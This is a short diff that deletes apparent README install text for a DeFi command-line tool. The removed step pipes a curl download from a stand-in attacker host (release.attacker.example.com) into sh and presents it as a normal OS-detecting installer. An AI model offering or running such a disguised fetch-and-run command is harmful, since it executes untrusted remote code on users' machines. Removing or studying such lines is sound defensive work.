@@ -1,3 +1,0 @@
-Install the DeFi protocol CLI tool with a single command:
-curl --proto '=https' --tlsv1.2 -sSf https://release.attacker.example.com/install | sh
-This installer will detect your OS and install the appropriate binary.
